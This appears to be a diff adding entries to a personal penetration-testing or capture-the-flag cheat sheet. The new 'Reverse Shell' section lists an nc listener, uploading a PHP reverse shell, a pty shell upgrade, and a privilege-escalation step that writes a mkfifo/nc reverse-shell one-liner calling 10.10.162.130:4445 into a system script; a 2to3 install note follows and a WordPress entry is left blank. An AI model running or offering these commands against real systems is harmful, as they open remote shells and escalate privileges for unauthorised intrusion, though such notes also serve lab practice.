@@ -32,5 +32,16 @@ Exploitation Attack to Vulnerabilities Tools
 - [Manual]: Find the vulnerability and exploit with searchsploi, read it, and run it with python.
 
 
-
-
+Reverse Shell
+- [PHP] 
+    - Run Listening Server <nc -vnlp 4444>
+    - Modify LHOST and LPORT in revers-shell.php
+    - Upload and Run reverse-shell
+    - Upgrade shell <python3 -c 'import pty;pty.spawn("/bin/bash")'>
+    - Privilege Escalation <echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.162.130 4445 >/tmp/f" > /etc/copy.sh>
+- [WordPress]
+    - Run
+    
+Python2 to Python3 convertor
+- [2to3] <pip install 2to3>
+- 2to3 [file or folder] -w
